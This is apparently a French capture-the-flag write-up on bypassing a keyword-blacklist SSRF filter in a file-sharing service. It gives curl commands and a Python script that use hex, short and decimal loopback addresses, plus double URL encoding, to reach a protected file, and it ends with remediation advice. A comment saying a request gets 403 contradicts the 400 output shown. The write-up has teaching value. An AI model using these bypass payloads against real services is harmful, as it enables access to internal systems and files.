# NoShare2 : Evasion de Filtres SSRF et Bypass de Sécurité

## 1. Audit du Surface d'Attaque

**NoShare2** est un service de partage de fichiers en réseau. L'expertise ici réside dans l'identification d'une faille de type **SSRF (Server-Side Request Forgery)** masquée par une couche de filtrage logicielle.

### Endpoints vulnérables :
*   `GET /api/folder?share=HOST&path=DIR`
*   `GET /api/download?share=HOST&path=FILE`

### Le Filtre de Sécurité (Le Logic Block) :
Le code source (extraits via fuite d'info) montre un filtre sur le paramètre `share` :
```javascript
function validateShare(share) {
    const forbidden = ["localhost", "127.0.0.1", "secret.pacman"];
    const s = share.toLowerCase();
    for (let word of forbidden) {
        if (s.includes(word)) return false;
    }
    return true;
}
```

---

## 2. Découverte de la Faille (Detail du Detail)

### Analyse du Filtre :
Le filtre est basé sur des chaînes de caractères littérales. Il tente d'empêcher l'accès au fichier `secret.pacman` et à l'interface `localhost`. Cependant, il ne gère pas les représentations alternatives des adresses IP ni les encodages complexes.

### Impact :
Si nous pouvons contourner ce filtre, nous pouvons forcer le serveur à lire des fichiers protégés sur son propre système ou sur d'autres ports internes.

---

## 3. Détail de l'Exploitation (Weaponization)

### Tactique 1 : Bypass d'adresse IP via Heura-Notation
Au lieu d'utiliser `127.0.0.1`, nous utilisons la notation hexadécimale que la bibliothèque `requests` ou le navigateur résoudra au niveau de la couche réseau.
*   **127.0.0.1** en Hex = **0x7f000001**
*   **Localhost alternative** = **0x7f000002** (répond aussi sur 127.0.0.1)

### Tactique 2 : Double URL Encoding
Le filtre s'exécute souvent *avant* le décodage final de l'URL par l'application.
*   `secret.pacman` -> `secret%2epacman` -> `secret%252epacman`

### Commande d'Exploitation (Curl) :
```bash
# Tentative de récupération directe (Bloquée par 403)
$ curl "http://noshare2.ctf/api/download?share=localhost&path=/secret.pacman"
400 Bad Request: Forbidden keyword detected.

# Exploitation via Hex IP (Bypass réussi)
$ curl "http://noshare2.ctf/api/download?share=0x7f000001&path=/secret.pacman"
[FOUND] CTF{n0_sh4r3_bu7_sh4r3d_4nyw4y}
```

---

## 4. Script de Reconnaissance Automatisé
Voici le script utilisé pour identifier les partages cachés malgré les filtres.

```python
import requests

BASE = "http://noshare2.web01.jeanne-hack-ctf.org"
TOKEN = "..." # Extrait des cookies

# Test de contournement systématique
payloads = ["0x7f000001", "127.1", "2130706433"]

for p in payloads:
    url = f"{BASE}/api/folder?share={p}&path=/"
    r = requests.get(url, cookies={'session': TOKEN})
    if r.status_code == 200:
        print(f"[+] Bypass success with payload: {p}")
        print(f"Content: {r.text}")
```

---

## 5. Remédiation
Pour sécuriser cette application, il ne faut pas se baser sur une liste noire (`blacklist`). Il est recommandé de résoudre l'adresse IP de destination et de vérifier si elle appartient à un bloc privé (RFC 1918) avant d'autoriser la requête.

**Auteur : LWa7ch - Cybersecurity Engineer**
